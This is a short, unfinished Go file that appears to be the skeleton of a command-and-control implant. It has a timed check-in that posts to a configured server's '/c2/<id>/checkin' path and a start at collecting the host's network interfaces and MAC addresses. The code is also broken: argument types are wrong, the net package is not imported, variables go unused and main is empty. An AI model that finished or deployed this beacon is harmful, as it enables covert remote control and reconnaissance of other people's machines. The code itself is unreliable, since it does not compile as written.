package main

import (
	"fmt"
	"time"
	"net/http"
	"runtime"
)

type task struct {
	task_id int
	input string
	output string
}

func HttpCheckForTasks (tasksAvailable chan <- bool, config map[string]string) {
	ticker := time.NewTicker(config["waitTime"])
	for t := range ticker.C {
		resp, err := http.Post(config["baseUrl"] + "/c2/" + config["id"] + "/checkin")

		// Decode JSON object

		
    }
}

func HttpInitialCheckin (config map[string]string) {
	// Initialize JSON object


	// Populate static fields

	// Make NICs 
	mac_addrs := net.Interfaces()

}

func main() {

}